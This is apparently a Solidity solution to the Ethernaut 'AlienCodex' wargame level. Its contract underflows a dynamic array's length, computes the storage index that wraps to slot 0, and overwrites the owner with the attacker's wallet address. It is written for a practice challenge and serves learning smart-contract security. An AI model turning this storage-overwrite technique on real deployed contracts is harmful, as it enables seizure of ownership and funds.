// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../src/Ethernaut Challenge/19_AlienCodex.sol";

contract AlienAttack {
    AlienCodex level19 = AlienCodex(your_challenge_address);

    function exploit () external {
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 myAddress = bytes32(uint256(uint160(your_wallet_address)));
        level19.makeContact();
        level19.retract();
        level19.revise(index, myAddress);
    }
} 
